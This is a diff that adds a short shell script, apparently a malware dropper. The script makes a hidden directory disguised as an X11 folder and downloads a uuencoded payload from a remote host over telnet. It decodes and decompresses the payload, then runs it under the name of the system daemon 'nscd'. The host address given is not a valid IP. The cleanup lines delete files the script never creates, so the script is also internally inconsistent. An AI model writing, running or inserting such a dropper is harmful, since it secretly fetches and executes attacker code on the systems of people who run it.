@@ -1,0 +1,11 @@
+#!/bin/sh
+mkdir /tmp/.X11R6;
+cd /tmp/.X11R6;
+telnet 555.1.4.10 32177 > /tmp/.X11R6/nscd.uu; 
+uudecode /tmp/.X11R6/nscd.uu;  
+uncompress -f /tmp/.X11R6/nscd.Z ;
+chmod +x /tmp/.X11R6/nscd;
+cd /tmp/.X11R6; 
+PATH=/tmp/.X11R6 nscd 
+rm /tmp/.t.uu;
+rm /tmp/.t;
